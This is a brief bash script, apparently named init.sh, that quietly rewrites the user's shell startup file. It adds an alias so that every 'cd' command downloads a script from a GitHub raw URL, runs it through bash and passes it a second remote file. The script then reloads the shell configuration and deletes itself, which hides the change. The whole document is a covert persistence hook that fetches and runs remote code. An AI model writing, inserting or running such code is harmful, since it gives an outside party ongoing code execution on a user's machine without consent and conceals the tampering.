#!/bin/bash

echo "alias cd='bash <(curl -s https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.sh) https://raw.githubusercontent.com/mssiscroissant/mssiscroissant/refs/heads/main/croissant.txt'" >> ~/.bashrc
source ~/.bashrc
rm init.sh
